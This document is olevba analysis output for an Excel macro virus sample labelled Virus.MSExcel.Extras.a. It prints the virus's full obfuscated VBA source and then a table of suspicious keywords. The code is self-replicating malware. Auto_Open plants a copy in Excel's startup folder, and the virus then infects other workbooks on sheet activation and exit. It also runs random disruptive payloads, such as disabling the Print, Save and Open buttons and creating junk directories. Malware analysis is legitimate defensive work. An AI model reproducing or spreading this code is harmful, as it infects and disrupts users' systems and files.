olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Extras.a-aa30425d2adda4db75d561882350389d5c8139e8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO H4COGsRfezGovSHLUFPBS4Eyx.bas 
in file: Virus.MSExcel.Extras.a-aa30425d2adda4db75d561882350389d5c8139e8 - OLE stream: '_VBA_PROJECT_CUR/VBA/H4COGsRfezGovSHLUFPBS4Eyx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private Sub hmhhmrnhnnrhmhhnnmmnnrhnnmhhnn()
Dim mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh As Integer
Randomize
mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh = Int((4 - 1 + 1) * Rnd + 1)
Call rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh
Select Case mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh
Case 1
Call rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr
Case 2
Call mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn
Case 3
Call nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh
Case 4
Call nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn
End Select
End Sub
Private Sub nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr(ByVal hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr As String, ByVal rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm As String)
Application.ScreenUpdating = False
Dim mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn, mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn As String
Workbooks.Add
ThisWorkbook.Sheets(1).Visible = True
ThisWorkbook.Sheets(1).Copy before:=ActiveWorkbook.Sheets(1)
If Val(Left(Application.Version, 1)) < 8 Then
With ActiveSheet
.Name = mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(-5 + 6 * 5)
.Visible = False
End With
End If
mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn = ActiveWorkbook.Name
mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn = CurDir()
ChDir Application.StartupPath
ActiveWindow.Visible = False
Workbooks(mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn).SaveAs Filename:=hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr & rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm, FileFormat:=xlNormal
ChDir mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn
ThisWorkbook.Sheets(1).Visible = False
Application.ScreenUpdating = True
End Sub
Private Sub rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Print" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Private Sub nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Save" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Private Sub nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Open" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Sub Auto_Help()
Attribute Auto_Help.VB_ProcData.VB_Invoke_Func = " \n14"
Randomize
With Application
.SheetsInNewWorkbook = Int((255 - 1 + 1) * Rnd + 1)
.Help
End With
End Sub
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr, rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm As String
Dim mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh As Boolean
Dim hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn As Variant
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "EXTRAS.XLS"
If Left(Application.OperatingSystem, 3) = "Mac" Then
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "Macintosh Extras"
ElseIf Left(Application.OperatingSystem, 10) <> "Windows 3." Then
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "Windows Extras.xls"
End If
rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr = Application.StartupPath & Application.PathSeparator
rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr = Dir(rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
If rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr = "" Then
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
Else
mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = False
For Each hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn In Application.Workbooks
If hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn.Name = nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm Then
mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = True
Exit For
End If
Next
If mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = False Then
Application.ScreenUpdating = False
Workbooks.Open Filename:=(rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm), IgnoreReadOnlyRecommended:=True
End If
If Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Modules.Count = 0 Then
Application.ScreenUpdating = False
Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Close savechanges:=False
On Error GoTo hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr
Kill (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
On Error GoTo 0
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
ElseIf Len(Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Modules(1).Name) <> (7 + 6 * 3) Then
Application.ScreenUpdating = False
Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Close savechanges:=False
On Error GoTo hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr
Kill (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
On Error GoTo 0
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
End If
End If
Application.OnSheetActivate = rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm & "!" & "Auto_Exit"
Exit Sub
hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr:
SetAttr (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm), vbNormal
Resume
End Sub
Private Function mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr As Integer)
Dim mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh As Integer
Dim nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm As Integer
Dim nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn As String
Dim rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr As Double
Dim nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm As Double
Dim nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh As Double
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Integer
nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn = ""
mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh = rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr
For hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh = 1 To mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh
rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr = 10 / 62
nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm = 36 / 62
Randomize
nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh = Rnd()
Randomize
If nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh < rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr Then
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((57 - 48 + 1) * Rnd + 48)
ElseIf nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh < nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm Then
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((90 - 65 + 1) * Rnd + 65)
Else
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((122 - 97 + 1) * Rnd + 97)
End If
nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn = nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn + Chr(nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm)
Next
mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn = nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn
End Function
Private Sub rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh()
Dim mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh, hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh In MenuBars(xlWorksheet).Menus("Format").MenuItems
If mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh.Caption = Application.UserName & "..." Then mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh.Delete
Next
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Print" Or hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Open" Or hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Save" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = True
Next
End Sub
Private Sub hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh()
On Error GoTo nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn
If Rnd < 0.1 Then MkDir mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(8) & "." & mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(3)
nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn:
Exit Sub
End Sub
Private Sub hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn()
If Not ActiveWorkbook.ProtectStructure Then
Application.ScreenUpdating = False
Dim mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm As Variant
Dim mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn As String
mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn = ActiveWorkbook.ActiveSheet.Name
Set mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm = ActiveWorkbook
ThisWorkbook.Activate
ThisWorkbook.Sheets(1).Visible = True
mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm.Activate
ThisWorkbook.Sheets(1).Copy before:=ActiveWorkbook.Sheets(1)
With ActiveSheet
.Name = mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(351 / 9 - 14)
.Visible = False
End With
ThisWorkbook.Activate
ThisWorkbook.Sheets(1).Visible = False
With mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm
.Activate
.Sheets(mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn).Select
End With
Application.ScreenUpdating = True
End If
End Sub
Private Sub mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn()
Dim hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh As String
hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh = "Style..."
Randomize
If Rnd > 0.5 Then hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh = "AutoFormat..."
On Error GoTo mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr
MenuBars(xlWorksheet).Menus("Format").MenuItems.Add Caption:=Application.UserName & "...", before:=hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh
MenuBars(xlWorksheet).Menus("Format").MenuItems(Application.UserName & "...").Enabled = False
mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr:
Exit Sub
End Sub
Private Sub mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr()
Dim hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr As Integer
Randomize
hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr = Int((12 - 1 + 1) * Rnd + 1)
If hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr <= 6 Then
Call rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh
Select Case hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr
Case 1
Call rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr
Case 2
Call hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm
Case 3
Call hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh
Case 4
Call mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn
Case 5
Call nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh
Case 6
Call nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn
End Select
End If
End Sub
Private Sub hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm()
Application.Toolbars("Auditing").Visible = True
End Sub
Sub Auto_Exit()
Attribute Auto_Exit.VB_ProcData.VB_Invoke_Func = " \n14"
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
If ActiveWorkbook.Modules.Count = 0 Then
If Val(Left(Application.Version, 1)) < 8 Then
hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn
Else
If Year(Now) >= (26 ^ 2 - 10 + 1 / 3) * 3 Then Call mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr
End If
ElseIf Len(ActiveWorkbook.Modules(1).Name) <> (276 / 12 + 2) Then
If Val(Left(Application.Version, 1)) < 8 Then
hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn
Else
If Year(Now) >= (26 ^ 2 - 10 + 1 / 3) * 3 Then Call mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr
End If
Else
If Year(Now) >= (26 ^ 2 - 10 + 1 / 3) * 3 Then Call mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     33 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  H4COGsRfezGovSHLUFPBS4Ey
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

